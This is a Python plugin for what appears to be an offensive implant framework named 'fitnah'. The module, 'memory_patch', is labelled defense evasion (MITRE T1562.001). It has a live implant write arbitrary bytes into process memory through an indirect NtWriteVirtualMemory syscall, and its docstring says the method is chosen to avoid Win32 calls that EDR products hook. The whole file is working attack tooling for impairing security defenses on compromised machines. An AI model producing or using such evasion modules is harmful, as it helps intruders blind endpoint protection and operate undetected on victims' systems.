"""defense_evasion/memory_patch — generic memory patch on agent via indirect syscall. MITRE T1562.001

Uses the implant's ISysNtWriteVirtualMemory (indirect syscall) to write arbitrary
bytes to a specified address in the current process — no CreateRemoteThread,
no WriteProcessMemory Win32 API call (which EDRs hook).
"""
import base64
from fitnah.sdk import BasePlugin, ModuleResult, Param, ParamSchema, mitre


class MemoryPatch(BasePlugin):
    NAME        = "memory_patch"
    DESCRIPTION = "Write arbitrary bytes to an address via ISysNtWriteVirtualMemory (indirect syscall)."
    AUTHOR      = "fitnah-team"
    MITRE       = "T1562.001"
    CATEGORY    = "defense_evasion"
    schema      = ParamSchema().add(
        Param("address",   str, required=True,  help="Target address as hex string (e.g. 0x7fff12345678)"),
        Param("patch_b64", str, required=True,  help="Base64-encoded bytes to write"),
    )

    @mitre("T1562.001")
    def run(self, session, params, ctx=None) -> ModuleResult:
        if ctx is None:
            return ModuleResult.err("Requires live session")
        r = ctx.send("mem_patch", {
            "address":   params["address"],
            "patch_b64": params["patch_b64"],
        })
        if r["status"] != "ok":
            return ModuleResult.err(f"mem_patch failed: {r['output']}")
        return ModuleResult.ok(data=r["output"] or "patch applied")
